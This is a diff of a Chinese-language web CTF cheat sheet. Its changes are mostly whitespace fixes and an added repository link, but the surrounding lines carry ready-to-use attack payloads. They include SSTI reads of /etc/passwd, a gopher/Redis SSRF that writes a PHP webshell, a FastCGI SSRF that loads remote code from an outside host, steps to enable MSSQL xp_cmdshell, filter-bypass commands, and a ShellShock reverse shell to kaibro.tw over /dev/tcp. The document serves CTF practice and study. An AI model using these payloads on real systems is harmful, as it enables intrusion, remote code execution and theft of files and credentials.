@@ -1,6 +1,8 @@
 WEB CTF CheatSheet
 ===
 
+[https://github.com/w181496/Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet)
+
 Table of Contents
 =================
 
@@ -368,11 +370,11 @@ A=fl;B=ag;cat $A$B
 
     ```
 - PHP變數有空格和.，會被轉成底線
-    
+
     ```
     parse_str("na.me=kaibro&pass wd=ggininder",$test);
     var_dump($test);
-    
+
     array(2) { 
         ["na_me"]=> string(6) "kaibro" 
         ["pass_wd"]=> string(9) "ggininder" 
@@ -384,7 +386,7 @@ A=fl;B=ag;cat $A$B
 
 - 在處理傳入的URL會有問題
 - `parse_url('/a.php?id=1')`
-    
+
     ```
     array(2) {
       ["host"]=>
@@ -496,11 +498,11 @@ echo preg_replace('/(.*)kaibro/e','\\1info()',$a);
 Example:
 
 Request: `http://kaibro.tw/test.php?url=%67%67`
-    
+​    
 * $_GET: `[url] => gg`
 
 * $_SERVER['REQUEST_URI']: `/test.php?url=%67%67`
-    
+
 * $_SERVER['QUERY_STRING']: `url=%67%67`
 
 ## OPcache
@@ -630,7 +632,7 @@ PS1=$(cat flag)
 - Empty Variable
     - `cat fl${x}ag`
     - `cat tes$(z)t/flag`
-    
+
 - Environment Variable
     - `$PATH => "/usr/local/….blablabla”`
         - `${PATH:0:1}   => '/'`
@@ -947,7 +949,7 @@ pop graphic-context
 
 - 快速查找帶關鍵字的表
     - `select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');
-    `
+      `
 
 - innodb
     - 表引擎為innodb
@@ -1048,7 +1050,7 @@ pop graphic-context
     - 在MSSQL 2000默認開啟
     - MSSQL 2005之後默認關閉
     - 有sa權限，可透過sp_configure重啟它
-    
+
     ```
     EXEC sp_configure 'show advanced options',1
     RECONFIGURE 
@@ -1056,7 +1058,7 @@ pop graphic-context
     RECONFIGURE
     ```
     - 關閉xp_cmdshell
-    
+
     ```
     EXEC sp_configure 'show advanced options', 1;
     RECONFIGURE;
@@ -1400,6 +1402,7 @@ HQL injection example (pwn2win 2017)
             $x = file_get_contents('./a.php');
             $p->addFromString('b.jpg', $x);
         ?>
+        ```
     - 構造 `?file=phar://phartest.zip/b.jpg`
 
 # 上傳漏洞
@@ -1499,7 +1502,7 @@ HQL injection example (pwn2win 2017)
 ---
 
 - Example
-    
+
 ```php
     <?php
 
@@ -1676,7 +1679,7 @@ Server-Side Template Injection
 ## Flask/Jinja2
 - Dump all used classes
     - `{{ ''.__class__.__mro__[2].__subclasses__() }}
-`
+      `
 - Read File
     - `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
 - Write File
@@ -1828,13 +1831,13 @@ http://[::]
             QUIT
         ```
         - URLencoded payload:
-        `gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT`
+          `gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20myshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20DIR%20%2fwww%2f%0D%0ACONFIG%20SET%20DBFILENAME%20shell.php%0D%0ASAVE%0D%0AQUIT`
     - FastCGI
         - default port: 9000
         - example
             - Discuz Pwn
                 - 302.php: `<?php
-header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
+                  header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%8b%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/www//index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20=%20On%09%26PHP_VALUEauto_prepend_file%20=%20http://kaibro.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );`
                 - x: `<?php system($_GET['cmd']); ?>`
                 - visit: `/forum.php?mod=ajax&action=downremoteimg&message=[img]http://kaibro.tw/302.php?.jpg[/img]`
     - MySQL
@@ -1859,7 +1862,7 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
         pop graphic-context
         ```
         - `$ convert ssrf.mvg out.png`
-    
+
 
 ## CRLF injection
 
@@ -2135,7 +2138,7 @@ https://csp-evaluator.withgoogle.com/
     - RCTF 2018 - rBlog
 
 - script nonce
-    
+
     ```
      <p>可控內容<p>
      <script src="xxx" nonce="AAAAAAAAAAA"></script>
@@ -2202,12 +2205,12 @@ https://csp-evaluator.withgoogle.com/
 
 - php > 4.2.0 會自動對`srand()`和`mt_srand()`播種
     - 只進行一次seed，不會每次`rand()`都seed
-    
+
 - 可以通過已知的random結果，去推算隨機數種子，然後就可以推算整個隨機數序列
 - 實際應用上可能會碰到連上的不是同個process，可以用`Keep-Alive
-`來確保連上同個php process(只會seed一次)
+  `來確保連上同個php process(只會seed一次)
 - 7.1以前`rand()`使用libc random()，其核心為：`
-state[i] = state[i-3] + state[i-31]`
+  state[i] = state[i-3] + state[i-31]`
     - 所以只要有31個連續隨機數就能預測接下來的隨機數
     - 後來`rand()` alias成`mt_rand()`，採用的是`Mersenne Twister`算法
 - Example: HITCON 2015 - Giraffe’s Coffee
@@ -2349,13 +2352,13 @@ state[i] = state[i-3] + state[i-31]`
 - 常見Port服務
     - http://packetlife.net/media/library/23/common_ports.pdf
 - `php -i | grep "Loaded Configuration File"`
-    
+
     - 列出php.ini路徑
 
 - `curl -i -X OPTIONS 'http://evil.com/'`
 
 - ShellShock
-    
+
     - `() { :; }; echo vulnerable`
     - `() { :a; }; /bin/cat /etc/passwd`
     - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/kaibro.tw/5566 0>&1'`
